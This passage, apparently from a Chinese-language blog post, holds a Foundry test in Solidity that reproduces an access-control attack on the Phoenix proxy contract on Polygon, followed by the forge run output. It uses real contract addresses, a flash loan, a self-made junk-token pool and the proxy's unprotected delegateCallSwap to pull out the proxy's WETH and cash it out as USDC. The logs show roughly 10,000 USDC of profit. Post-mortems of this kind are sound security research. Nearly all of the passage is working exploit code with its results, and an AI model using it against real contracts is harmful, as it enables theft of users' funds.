+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/Test.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;lib/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">phxProxy</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">buyLeverage</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">minAmount</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">deadLine</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">delegateCallSwap</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="nb">data</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">DPPAdvanced</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flashLoan</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">baseAmount</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">quoteAmount</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">assetTo</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//https://polygonscan.com/address/0x65baf1dc6fa0c7e459a36e2e310836b396d1b1de#code
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">phxProxy</span> <span class="k">constant</span> <span class="n">PHX_PROXY</span> <span class="o">=</span> <span class="n">phxProxy</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">IUniswapV2Router02</span> <span class="k">constant</span> <span class="n">QuickSwapRouter</span> <span class="o">=</span> <span class="n">IUniswapV2Router02</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DPPAdvanced</span> <span class="k">constant</span> <span class="n">DPP</span> <span class="o">=</span> <span class="n">DPPAdvanced</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x1093ceD81987Bf532c2b7907B2A8525cd0C17295</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">IERC20</span> <span class="k">constant</span> <span class="n">USDC</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="mh">0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">IERC20</span> <span class="k">constant</span> <span class="n">WETH</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="mh">0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 我们自己的垃圾币
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">contract</span> <span class="nc">ExampleToken</span> <span class="k">is</span> <span class="n">ERC20</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="n">ERC20</span><span class="p">(</span><span class="s">&#34;Example&#34;</span><span class="p">,</span> <span class="s">&#34;EXM&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_mint</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="mi">1</span><span class="n">_500_000</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">HackTest</span> <span class="k">is</span> <span class="n">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ExampleToken</span> <span class="n">myToken</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="s">&#34;polygon&#34;</span><span class="p">,</span> <span class="mi">40066946</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">myToken</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ExampleToken</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">deal</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">WETH</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">label</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">PHX_PROXY</span><span class="p">),</span> <span class="s">&#34;PHX_PROXY&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">label</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">QuickSwapRouter</span><span class="p">),</span> <span class="s">&#34;QuickSwapRouter&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">label</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">DPP</span><span class="p">),</span> <span class="s">&#34;DPP&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">label</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">USDC</span><span class="p">),</span> <span class="s">&#34;USDC&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">label</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">WETH</span><span class="p">),</span> <span class="s">&#34;WETH&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">label</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="mh">0x6d68bEB09ea7e76d561EA8C4Aac34A6611dd9821</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;LogicContractOfProxy&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">label</span><span class="p">(</span><span class="mh">0x0a6293a64D4C2EaaB8e349FA6A9F4D238d46b491</span><span class="p">,</span> <span class="s">&#34;polygonOracle&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">label</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="mh">0xd0289082cf4c5c2ba448B4B9c67232729aa75EfA</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;coinInfo.stakePool&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">label</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="mh">0x1021024d6Dc53BCb929eA0e6A664194809C9464a</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;Logic of coinInfo.stakePool&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">testHack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;Attacker USDC balance before exploit:&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">USDC</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">6</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;Attacker WETH balance before exploit:&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">WETH</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">18</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// 1. 构建垃圾币交易池， 方便代理合约过来置换~~
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">myToken</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">QuickSwapRouter</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">WETH</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">QuickSwapRouter</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">QuickSwapRouter</span><span class="p">.</span><span class="n">addLiquidity</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="n">myToken</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="n">WETH</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">7</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e15</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">7</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e15</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// 2. 使用闪电贷，贷款以向代理合约购买Leverage Token
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// https://dodoex.github.io/docs/docs/flashSwap
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">DPP</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">7990000000</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="k">new</span> <span class="kt">bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">DPPFlashLoanCall</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;WETH.balanceOf(address(PHX_PROXY)) before buyLeverage: &#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">WETH</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">PHX_PROXY</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">18</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 3, 向代理合约购买Leverage Token, make the proxy contract rich~
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">USDC</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">PHX_PROXY</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PHX_PROXY</span><span class="p">.</span><span class="n">buyLeverage</span><span class="p">(</span><span class="mi">7990000000</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span><span class="p">,</span> <span class="k">new</span> <span class="kt">bytes</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">swapAmount</span> <span class="o">=</span> <span class="n">WETH</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">PHX_PROXY</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;WETH.balanceOf(address(PHX_PROXY)) after buyLeverage: &#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">WETH</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">PHX_PROXY</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">18</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//4. 让代理合约用它的WETH来置换我们的垃圾币
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 然后代理合约的WETH转移到我们垃圾币交易池中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">swapData</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="mh">0xa9678a18</span><span class="p">,</span> <span class="c1">//swap
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">address</span><span class="p">(</span><span class="n">QuickSwapRouter</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="n">WETH</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="n">myToken</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">swapAmount</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PHX_PROXY</span><span class="p">.</span><span class="n">delegateCallSwap</span><span class="p">(</span><span class="n">swapData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;WETH.balanceOf(address(PHX_PROXY)) after exploit: &#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">WETH</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">PHX_PROXY</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">18</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// 5. 这里写成2步更容易理解
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 5.1 我们用另外一堆垃圾币向我们创建的交易池（mytoken &lt;=&gt; WETH）进行置换，将它收到的代理合约给的WETH置换出来
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 5.2 然后我们将得到的WETH又到其他的交易池（WETH &lt;=&gt; USDC）进行置换，以套现
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">address</span><span class="p">[](</span><span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">myToken</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">WETH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">USDC</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">amounts</span> <span class="o">=</span> <span class="n">QuickSwapRouter</span><span class="p">.</span><span class="n">swapExactTokensForTokens</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">1000000000000000000000000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span><span class="s">&#34;swap amounts[0]&#34;</span><span class="p">,</span> <span class="n">amounts</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span><span class="s">&#34;swap amounts[1]&#34;</span><span class="p">,</span> <span class="n">amounts</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span><span class="s">&#34;swap amounts[2]&#34;</span><span class="p">,</span> <span class="n">amounts</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;Attacker USDC balance after exploit:&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">USDC</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">6</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//归还贷款 (DODO Flash Loan 不要手续费 )
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">USDC</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">DPP</span><span class="p">),</span> <span class="mi">7990000000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;Attacker USDC balance after return FlashLoan:&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">USDC</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">6</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;Attacker WETH balance after exploit:&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">WETH</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">18</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">~ ❯ forge test --match-contract HackTest  -vv         
+</span></span><span class="line"><span class="cl">[⠔] Compiling...
+</span></span><span class="line"><span class="cl">[⠑] Compiling 1 files with 0.8.17
+</span></span><span class="line"><span class="cl">[⠘] Solc 0.8.17 finished in 2.16s
+</span></span><span class="line"><span class="cl">Compiler run successful
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Running 1 test for test/hack.t.sol:HackTest
+</span></span><span class="line"><span class="cl">[PASS] testHack() (gas: 3381824)
+</span></span><span class="line"><span class="cl">Logs:
+</span></span><span class="line"><span class="cl">  Attacker USDC balance before exploit:: 0.000000
+</span></span><span class="line"><span class="cl">  Attacker WETH balance before exploit:: 1.000000000000000000
+</span></span><span class="line"><span class="cl">  WETH.balanceOf(address(PHX_PROXY)) before buyLeverage: : 0.000000000423128453
+</span></span><span class="line"><span class="cl">  WETH.balanceOf(address(PHX_PROXY)) after buyLeverage: : 11.407989927123285963
+</span></span><span class="line"><span class="cl">  WETH.balanceOf(address(PHX_PROXY)) after exploit: : 0.000000000000000000
+</span></span><span class="line"><span class="cl">  swap amounts[0]: 1000000.000000000000000000
+</span></span><span class="line"><span class="cl">  swap amounts[1]: 11.414989927073990725
+</span></span><span class="line"><span class="cl">  swap amounts[2]: 18108.937231
+</span></span><span class="line"><span class="cl">  Attacker USDC balance after exploit:: 18108.937231
+</span></span><span class="line"><span class="cl">  Attacker USDC balance after return FlashLoan:: 10118.937231
+</span></span><span class="line"><span class="cl">  Attacker WETH balance after exploit:: 0.993000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-03-15</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/phoenix-access-control-attack/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
